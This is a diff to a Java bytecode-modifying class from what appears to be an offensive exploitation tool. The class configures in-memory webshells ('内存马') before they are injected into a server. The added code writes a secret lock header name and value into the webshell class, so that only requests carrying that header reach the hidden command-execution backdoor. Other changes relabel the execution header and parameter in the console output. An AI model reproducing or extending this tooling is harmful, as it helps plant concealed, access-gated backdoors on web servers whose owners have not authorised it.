@@ -101,6 +101,16 @@ public class JavaClassModifier {
         if (javaClassHelper == null)
             return;
 
+        // 内存马约束请求头
+        if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.lockHeaderKey) && AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.lockHeaderValue)) {
+            String lockHeaderKey = javaClassHelper.getLockHeaderKey();
+            String lockHeaderValue = javaClassHelper.getLockHeaderValue();
+
+            Printer.yellowInfo(String.format("Use ms must contain  %s: %s", lockHeaderKey, lockHeaderValue));
+            JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.lockHeaderKey, String.format("private String %s = \"%s\";", JavaClassModifiable.lockHeaderKey, lockHeaderKey));
+            JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.lockHeaderValue, String.format("private String %s = \"%s\";", JavaClassModifiable.lockHeaderValue, lockHeaderValue));
+        }
+
         // 内存马类名
         if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.CLASSNAME)) {
             String classname = javaClassHelper.getCLASSNAME();
@@ -116,12 +126,12 @@ public class JavaClassModifier {
         }
         if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.HEADER)) {
             String header = javaClassHelper.getHEADER();
-            Printer.yellowInfo(String.format("Header: %s", header));
+            Printer.yellowInfo(String.format("Exec Header: %s", header));
             JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.HEADER, String.format("private static String %s = \"%s\";", JavaClassModifiable.HEADER, header));
         }
         if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.PARAM)) {
             String param = javaClassHelper.getPARAM();
-            Printer.yellowInfo(String.format("Param: %s", param));
+            Printer.yellowInfo(String.format("Exec Param: %s", param));
             JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.PARAM, String.format("private static String %s = \"%s\";", JavaClassModifiable.PARAM, param));
         }
         if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.PATH)) {
